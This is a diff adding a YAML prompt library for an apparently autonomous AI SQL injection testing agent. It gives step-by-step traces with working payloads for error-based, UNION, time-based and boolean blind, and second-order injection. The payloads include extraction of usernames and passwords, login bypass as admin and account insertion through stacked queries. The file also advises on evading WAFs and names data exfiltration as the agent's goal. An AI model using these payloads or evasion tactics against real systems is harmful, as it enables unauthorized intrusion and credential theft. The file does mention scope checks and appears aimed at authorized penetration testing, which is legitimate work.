@@ -1,0 +1,447 @@
+# SQL Injection Few-Shot Reasoning Library
+# ==========================================
+# This library teaches the AI *how to reason* about SQLi testing,
+# not just which payloads to fire. Each example shows:
+# - The reasoning process (chain-of-thought)
+# - The action taken
+# - The expected evidence
+# - How to adapt to context
+#
+# CRITICAL: Do NOT copy payloads verbatim. Adapt to:
+#   - Target tech stack (MySQL, PostgreSQL, SQL Server, Oracle, SQLite)
+#   - WAF/rate-limit behavior observed
+#   - Scope boundaries (is_in_scope)
+#   - Previous findings in this mission
+
+meta:
+  version: "1.0"
+  vulnerability_class: "SQLi"
+  severity_baseline: "HIGH"
+  cvss_vector_base: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+  # Technique tags (MITRE ATT&CK / CAPEC)
+  techniques:
+    - "T1190"  # Exploit Public-Facing Application
+    - "CAPEC-66"  # SQL Injection
+
+# ==========================================
+# REASONING TRACES (Chain-of-Thought Examples)
+# ==========================================
+
+reasoning_traces:
+
+  # ------------------------------------------------------------------
+  # Trace 1: Error-Based SQLi Discovery via Baseline Comparison
+  # ------------------------------------------------------------------
+  - id: "trace_sqli_error_based_01"
+    name: "Error-based SQLi via single-quote injection with baseline diff"
+    scenario: |
+      Target: PHP 8.2 + MySQL 8.0 login endpoint
+      Parameter: POST /login username
+      Baseline: Normal login returns 200 OK with "Welcome" or "Invalid credentials"
+    reasoning: |
+      1. ESTABLISH BASELINE: Send valid credentials → observe 200 OK, response length ~1.2KB, no SQL errors
+      2. INJECT SINGLE QUOTE: Send username=' → observe 500 Internal Server Error with SQL syntax error in body
+         - Error: "You have an error in your SQL syntax near '' at line 1"
+      3. DIFF ANALYSIS: Status 200→500, body contains MySQL error signature → STRONG indicator of error-based SQLi
+      4. CONFIRM INJECTABILITY: Send username='' (two quotes) → returns 200 OK (valid syntax) → confirms injection point
+      5. MAP ATTACK SURFACE: Test if error reflects in response body (exfiltration path) or only in logs
+    action:
+      tool: "active_fuzzer"
+      operation: "fuzz_parameter"
+      params:
+        url: "https://target.com/login"
+        method: "POST"
+        parameter: "username"
+        payloads:
+          - "'"
+          - "''"
+          - "' OR '1'='1"
+          - "' UNION SELECT NULL--"
+        baseline_capture: true
+    expected_evidence:
+      - "HTTP 500 with SQL syntax error on single quote"
+      - "HTTP 200 on double quote (valid syntax)"
+      - "Error message contains table/column names (bonus)"
+    confidence: 0.92
+    adaptation_notes: |
+      - If WAF blocks single quote: try encoded variants (%27, %2527) or comment terminators (--, #)
+      - If no error reflected: switch to time-based or boolean-based blind
+      - If PostgreSQL: error format differs ("syntax error at or near")
+      - If SQL Server: look for "Unclosed quotation mark" or "Incorrect syntax near"
+
+  # ------------------------------------------------------------------
+  # Trace 2: UNION-Based Exfiltration with Column Enumeration
+  # ------------------------------------------------------------------
+  - id: "trace_sqli_union_01"
+    name: "UNION-based data exfiltration with column count discovery"
+    scenario: |
+      Target: Search endpoint GET /search?q=
+      Confirmed: Error-based SQLi on 'q' parameter (MySQL)
+      Goal: Extract data via UNION SELECT
+    reasoning: |
+      1. DETERMINE COLUMN COUNT: Inject ' UNION SELECT NULL-- → error "different number of columns"
+         Increment NULLs until no error: ' UNION SELECT NULL,NULL,NULL-- → success = 3 columns
+      2. IDENTIFY REFLECTIVE COLUMNS: ' UNION SELECT 'test',NULL,NULL-- → check if 'test' appears in response
+         Repeat for each position → find which columns reflect in output
+      3. ENUMERATE DATABASE METADATA:
+         - ' UNION SELECT database(),NULL,NULL-- → current DB name
+         - ' UNION SELECT version(),NULL,NULL-- → MySQL version
+         - ' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- → all DBs
+      4. EXFILTRATE TARGET TABLE: ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='target_db'--
+      5. EXFILTRATE COLUMNS: ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+      6. EXFILTRATE DATA: ' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--
+    action:
+      tool: "active_fuzzer"
+      operation: "fuzz_parameter"
+      params:
+        url: "https://target.com/search"
+        method: "GET"
+        parameter: "q"
+        payloads:
+          - "' UNION SELECT NULL--"
+          - "' UNION SELECT NULL,NULL--"
+          - "' UNION SELECT NULL,NULL,NULL--"
+          - "' UNION SELECT 'test',NULL,NULL--"
+          - "' UNION SELECT database(),NULL,NULL--"
+          - "' UNION SELECT version(),NULL,NULL--"
+          - "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--"
+        baseline_capture: true
+    expected_evidence:
+      - "Column count determined (no error at N NULLs)"
+      - "Reflective column positions identified"
+      - "Database name, version, schema names extracted"
+      - "Table/column names from information_schema"
+      - "Actual data rows (usernames, hashes, etc.)"
+    confidence: 0.88
+    adaptation_notes: |
+      - If ORDER BY required: ' UNION SELECT 1,2,3 ORDER BY 1--
+      - If LIMIT needed: ' UNION SELECT ... LIMIT 10 OFFSET 0--
+      - If no reflective columns: switch to time-based blind or error-based exfiltration
+      - For PostgreSQL: use UNION SELECT ... FROM pg_catalog.pg_tables
+      - For SQL Server: use UNION SELECT ... FROM INFORMATION_SCHEMA.TABLES
+
+  # ------------------------------------------------------------------
+  # Trace 3: Time-Based Blind SQLi (No Error Reflection)
+  # ------------------------------------------------------------------
+  - id: "trace_sqli_time_blind_01"
+    name: "Time-based blind SQLi via SLEEP/BENCHMARK with statistical validation"
+    scenario: |
+      Target: API endpoint /api/users?id=
+      No error messages reflected, no UNION reflection
+      Parameter: id (integer)
+    reasoning: |
+      1. BASELINE TIMING: Send 10 normal requests (id=1) → measure avg response time (e.g., 120ms ± 15ms)
+      2. INJECT TIME DELAY: id=1 AND SLEEP(5)-- → observe ~5.1s response
+      3. STATISTICAL VALIDATION: Send 5 delayed requests → all > 4.5s (p < 0.001 vs baseline)
+      4. CONFIRM BOOLEAN CONTROL: id=1 AND 1=1-- → fast; id=1 AND 1=2-- → fast (no delay)
+         This proves the delay is conditional on our injection
+      5. EXTRACT DATA BIT BY BIT:
+         - id=1 AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a', SLEEP(3), 0)--
+         - Iterate charset (a-z, 0-9, special) per position
+      6. OPTIMIZE: Use binary search on ASCII values (7 requests/char vs 36)
+    action:
+      tool: "active_fuzzer"
+      operation: "fuzz_parameter"
+      params:
+        url: "https://target.com/api/users"
+        method: "GET"
+        parameter: "id"
+        payloads:
+          - "1 AND SLEEP(5)--"
+          - "1 AND 1=1--"
+          - "1 AND 1=2--"
+          - "1 AND IF((SELECT SUBSTRING(version(),1,1)='5'), SLEEP(3), 0)--"
+        baseline_capture: true
+        timing_analysis: true
+        sample_count: 5
+    expected_evidence:
+      - "Baseline avg: ~120ms, Injected avg: >4.5s (statistically significant)"
+      - "Control payloads (1=1, 1=2) return baseline timing"
+      - "Conditional delay triggers only when condition true"
+    confidence: 0.85
+    adaptation_notes: |
+      - MySQL: SLEEP(n), BENCHMARK(count,expr)
+      - PostgreSQL: pg_sleep(n)
+      - SQL Server: WAITFOR DELAY '00:00:05'
+      - Oracle: DBMS_PIPE.RECEIVE_MESSAGE('x',5)
+      - If network jitter high: increase sample_count, use relative timing (ratio > 10x)
+      - Consider "heavy query" DoS risk — limit concurrent time-based tests
+
+  # ------------------------------------------------------------------
+  # Trace 4: Boolean-Based Blind SQLi (Content Diff)
+  # ------------------------------------------------------------------
+  - id: "trace_sqli_boolean_blind_01"
+    name: "Boolean-based blind via response content differential analysis"
+    scenario: |
+      Target: Product page /product?id=
+      No errors, no time delays observable
+      Content changes based on query result (product exists vs not)
+    reasoning: |
+      1. BASELINE CONTENT: id=1 → returns product page (length ~15KB, contains "Product A")
+      2. FALSE CONDITION: id=1 AND 1=2 → returns empty/not-found page (length ~2KB, "Not found")
+      3. TRUE CONDITION: id=1 AND 1=1 → returns product page (same as baseline)
+      4. DIFFERENTIAL ORACLE: Content length/hash differs between TRUE and FALSE → can extract bits
+      5. EXTRACT DATA: id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
+         If returns product page → char='a'; if not-found → char≠'a'
+    action:
+      tool: "active_fuzzer"
+      operation: "fuzz_parameter"
+      params:
+        url: "https://target.com/product"
+        method: "GET"
+        parameter: "id"
+        payloads:
+          - "1 AND 1=1"
+          - "1 AND 1=2"
+          - "1 AND (SELECT SUBSTRING(version(),1,1)='5')"
+          - "1 AND (SELECT SUBSTRING(user(),1,1)='r')"
+        baseline_capture: true
+        content_analysis: true
+    expected_evidence:
+      - "Distinct response length/hash for TRUE vs FALSE conditions"
+      - "Version/user extraction via boolean oracle"
+    confidence: 0.82
+    adaptation_notes: |
+      - Works when error/time channels unavailable
+      - Slower than time-based (1 bit per request vs 1 char per 7 requests)
+      - Use binary search on ASCII for efficiency
+      - Watch for caching — add cache-buster param (?cb=random)
+
+  # ------------------------------------------------------------------
+  # Trace 5: Second-Order / Stored SQLi
+  # ------------------------------------------------------------------
+  - id: "trace_sqli_second_order_01"
+    name: "Second-order SQLi via registration → login flow"
+    scenario: |
+      Target: Register → Login flow
+      Registration: username, email, password
+      Login: username, password
+      Hypothesis: Username stored unsanitized, used in login query without parameterization
+    reasoning: |
+      1. REGISTER PAYLOAD: username=admin'-- → register succeeds
+      2. LOGIN TRIGGER: Login with username=admin'-- and any password
+      3. QUERY RECONSTRUCTION: SELECT * FROM users WHERE username='admin'--' AND password='...'
+         The -- comments out password check → login as admin without password
+      4. ALTERNATIVE: username=admin'; INSERT INTO users...-- (if stacked queries allowed)
+    action:
+      tool: "active_fuzzer"
+      operation: "fuzz_parameter"
+      params:
+        url: "https://target.com/register"
+        method: "POST"
+        parameter: "username"
+        payloads:
+          - "admin'--"
+          - "test'; INSERT INTO users(username,password) VALUES('hacker','hash')--"
+          - "victim' OR '1'='1"
+        follow_up:
+          - url: "https://target.com/login"
+            method: "POST"
+            test_payloads:
+              - "admin'--"
+    expected_evidence:
+      - "Registration succeeds with payload"
+      - "Login as admin without password succeeds"
+      - "Or: New user created via stacked query"
+    confidence: 0.75
+    adaptation_notes: |
+      - Requires multi-step flow (register → login)
+      - Check if stacked queries supported (MySQL: no by default; PG: yes; MSSQL: yes)
+      - Test both -- and # comment styles
+      - May need URL encoding for special chars
+
+# ==========================================
+# ANTI-PATTERNS (What NOT To Do)
+# ==========================================
+
+anti_patterns:
+
+  - id: "anti_01"
+    name: "Blind payload spraying without baseline"
+    description: |
+      Firing 50+ payloads at a parameter without first establishing
+      baseline response (status, length, timing, headers).
+    why_bad: |
+      - Wastes rate limit budget
+      - Triggers WAF/IPS alerts unnecessarily
+      - No differential oracle → can't distinguish true positives
+      - Generates noise that masks real findings
+    correct_approach: |
+      1. Capture baseline (10-20 normal requests)
+      2. Single-quote test → observe diff
+      3. Only then expand payload set based on observed channel
+
+  - id: "anti_02"
+    name: "Assuming all SQL errors = exploitable SQLi"
+    description: |
+      Seeing a SQL error in response and immediately reporting "Critical SQLi"
+      without confirming injectability and data exfiltration path.
+    why_bad: |
+      - Some errors are from sanitized/parameterized queries that fail on type mismatch
+      - Error might be in a different query branch (not user-controlled)
+      - No proof of data access = not exploitable
+    correct_approach: |
+      1. Confirm syntax control (double quote fixes error)
+      2. Demonstrate data exfiltration (UNION, time-based, boolean)
+      3. Report with evidence: extracted data, not just error screenshot
+
+  - id: "anti_03"
+    name: "Ignoring WAF/rate-limit feedback"
+    description: |
+      Continuing same payload pattern after 403/429/WAF block page.
+    why_bad: |
+      - Burns IP reputation
+      - Alerts defenders
+      - Zero chance of success with same vector
+    correct_approach: |
+      1. On 403/429/WAF page: STOP current vector
+      2. Analyze block signature (which payload triggered?)
+      3. Switch: encoding, fragmentation, alternative channel (header, JSON, path)
+      4. Reduce rate, add jitter
+
+  - id: "anti_04"
+    name: "Single-channel fixation"
+    description: |
+      Only trying UNION because it worked once, ignoring time-based/boolean
+      when UNION fails.
+    why_bad: |
+      - Different endpoints have different reflection capabilities
+      - WAF may block UNION but not SLEEP
+      - Blind channels often more reliable for exfiltration
+    correct_approach: |
+      Master all 4 channels:
+      1. Error-based (fastest, most data)
+      2. UNION-based (fast, structured data)
+      3. Time-based (works when no reflection)
+      4. Boolean-based (last resort, slowest)
+      → Try in order, fall back gracefully
+
+  - id: "anti_05"
+    name: "No scope validation before injection"
+    description: |
+      Injecting payloads into parameters that resolve to out-of-scope domains/IPs.
+    why_bad: |
+      - Legal/ethical violation
+      - Governance gate should block, but defense-in-depth needed
+    correct_approach: |
+      1. ALWAYS call is_in_scope(target) before any injection
+      2. Validate parameter domain matches authorized scope
+      3. Log scope check result in finding evidence
+
+# ==========================================
+# META-INSTRUCTIONS (Injected into AI Prompt)
+# ==========================================
+
+meta_instructions: |
+  You are an autonomous SQLi testing agent. These references teach REASONING PATTERNS.
+
+  DO:
+  - Study the reasoning traces: how baseline → diff → hypothesis → confirm → exfiltrate
+  - Adapt payloads to observed context (tech stack, WAF, channel availability)
+  - Chain channels: error → UNION → time/boolean fallback
+  - Validate scope before every injection
+  - Report with evidence: extracted data, not just "vulnerable"
+
+  DO NOT:
+  - Copy payloads verbatim without adaptation
+  - Spray payloads without baseline
+  - Report errors without injectability proof
+  - Ignore WAF/rate-limit signals
+  - Fixate on one exfiltration channel
+
+  REMEMBER: Your goal is CONFIRMED DATA EXFILTRATION, not "triggering an error".
+
+# ==========================================
+# TECHNIQUE MATRIX (Quick Channel Selection)
+# ==========================================
+
+technique_selection_guide:
+  error_based:
+    when: "SQL errors reflected in response body/headers"
+    speed: "Fastest"
+    data_volume: "High"
+    reliability: "High (if errors visible)"
+    prerequisites: "Error messages not suppressed"
+
+  union_based:
+    when: "Error-based works AND reflective columns exist"
+    speed: "Fast"
+    data_volume: "High (structured)"
+    reliability: "High"
+    prerequisites: "Column count known, at least 1 reflective column"
+
+  time_based:
+    when: "No error reflection, no UNION reflection, but conditional execution works"
+    speed: "Slow (1 char ~ 5-10 reqs)"
+    data_volume: "Medium"
+    reliability: "Medium (network jitter)"
+    prerequisites: "SLEEP/WAITFOR/pg_sleep available, stable network"
+
+  boolean_based:
+    when: "No errors, no time delay observable, but content differs on TRUE/FALSE"
+    speed: "Slowest (1 bit per req)"
+    data_volume: "Low-Medium"
+    reliability: "High (content diff is binary)"
+    prerequisites: "Distinct TRUE/FALSE response (length, hash, keyword)"
+
+  second_order:
+    when: "Input stored and used later in different context (login, report, export)"
+    speed: "Variable"
+    data_volume: "Variable"
+    reliability: "Medium"
+    prerequisites: "Multi-step flow, stored input reused unsafely"
+
+# ==========================================
+# DBMS-SPECIFIC QUICK REFERENCE
+# ==========================================
+
+dbms_differences:
+  mysql:
+    comment: "-- , #"
+    version: "SELECT version()"
+    current_db: "SELECT database()"
+    user: "SELECT user()"
+    sleep: "SLEEP(n)"
+    info_schema: "information_schema.tables/columns"
+    union: "Supported"
+    stacked: "No (by default)"
+
+  postgresql:
+    comment: "--"
+    version: "SELECT version()"
+    current_db: "SELECT current_database()"
+    user: "SELECT current_user"
+    sleep: "pg_sleep(n)"
+    info_schema: "information_schema.tables/columns"
+    union: "Supported"
+    stacked: "Yes (with ;)"
+
+  sqlserver:
+    comment: "--"
+    version: "SELECT @@version"
+    current_db: "SELECT DB_NAME()"
+    user: "SELECT USER_NAME()"
+    sleep: "WAITFOR DELAY '00:00:05'"
+    info_schema: "INFORMATION_SCHEMA.TABLES/COLUMNS"
+    union: "Supported"
+    stacked: "Yes"
+
+  oracle:
+    comment: "--"
+    version: "SELECT * FROM v$version"
+    current_db: "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
+    user: "SELECT USER FROM dual"
+    sleep: "DBMS_PIPE.RECEIVE_MESSAGE('x',5)"
+    info_schema: "ALL_TABLES/ALL_TAB_COLUMNS"
+    union: "Supported"
+    stacked: "No"
+
+  sqlite:
+    comment: "--"
+    version: "SELECT sqlite_version()"
+    current_db: "N/A (file-based)"
+    user: "N/A"
+    sleep: "N/A (use heavy query)"
+    info_schema: "sqlite_master"
+    union: "Supported"
+    stacked: "No"
